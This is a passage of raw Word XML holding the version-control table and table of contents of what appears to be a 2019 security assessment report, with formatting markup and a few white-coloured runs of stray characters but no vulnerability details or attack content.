        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="179" w:lineRule="exact"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Version control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="308" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2380"/>
          <w:tab w:val="left" w:pos="4280"/>
          <w:tab w:val="left" w:pos="6540"/>
        </w:tabs>
        <w:ind w:left="1340"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Version</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Date</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Author</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="209" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:ind w:left="1340"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="002D1253" w:rsidRPr="00802CE3">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="240" w:charSpace="-2049"/>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> V1.0 </w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"#</w:t>
      </w:r>
      <w:r w:rsidR="004819BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>July26</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidR="004819BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, 2019</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="00A86587" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. /0!</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Indrajeet</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Singh</w:t>
      </w:r>
      <w:r w:rsidR="00A86587" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5       67!58</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FinalDraft</w:t>
      </w:r>
      <w:r w:rsidR="004819BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.467!:;83!-/;0!383;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="002D1253" w:rsidRPr="00802CE3">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="3" w:space="720" w:equalWidth="0">
            <w:col w:w="5320" w:space="440"/>
            <w:col w:w="3600" w:space="720"/>
            <w:col w:w="1439"/>
          </w:cols>
          <w:docGrid w:linePitch="240" w:charSpace="-2049"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="000122C4" w:rsidP="004819BF">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="300"/>
        </w:tabs>
        <w:ind w:right="1420"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251644416" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="70D36CB3" wp14:editId="79FDFF57">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-227965</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>212090</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="13970" cy="1397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70" cy="139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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251646464" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2039B79A" wp14:editId="61454052">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>6361430</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="13970" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="508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70" cy="179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2" w:name="page19"/>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A" w:rsidP="009933A3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="302" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="720" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="0000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:noHBand="0" w:noVBand="0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8380"/>
      </w:tblGrid>
      <w:tr w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00790D65" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>1 Executive Summary</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="418"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>2 Scope Of Work</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>3 Vulnerability Breakdown</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>4 Vulnerability Details</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>Appendix A. Application Risk Score Matrix</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="418"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>Appendix B. Terminology</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00C05D34" w:rsidRPr="00802CE3" w:rsidRDefault="00C05D34" w:rsidP="00C05D34">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
              <w:t>Appendi</w:t>
            </w:r>
            <w:r w:rsidR="0092093C">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
              <w:t>x C. Methodology for</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
              <w:t xml:space="preserve"> Assessment</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="006C474E" w:rsidRPr="00802CE3" w:rsidRDefault="006C474E" w:rsidP="006C474E">
            <w:pPr>
              <w:autoSpaceDE w:val="0"/>
              <w:autoSpaceDN w:val="0"/>
              <w:adjustRightInd w:val="0"/>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:sz w:val="40"/>
                <w:szCs w:val="40"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="418"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="261"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253" w:rsidP="000A5EB8">
            <w:pPr>
              <w:spacing w:line="261" w:lineRule="exact"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="247"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:spacing w:line="247" w:lineRule="exact"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00C05D34">
        <w:trPr>
          <w:trHeight w:val="318"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8380" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253"/>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="000122C4" w:rsidP="000A5EB8">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="9990"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="002D1253" w:rsidRPr="00802CE3">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="240" w:charSpace="-2049"/>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251648512" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="656BE1B9" wp14:editId="76BF71FC">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>6361430</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="13970" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="508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70" cy="179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3" w:name="page20"/>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w:rsidR="001B5937" w:rsidRPr="00802CE3" w:rsidRDefault="001B5937">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
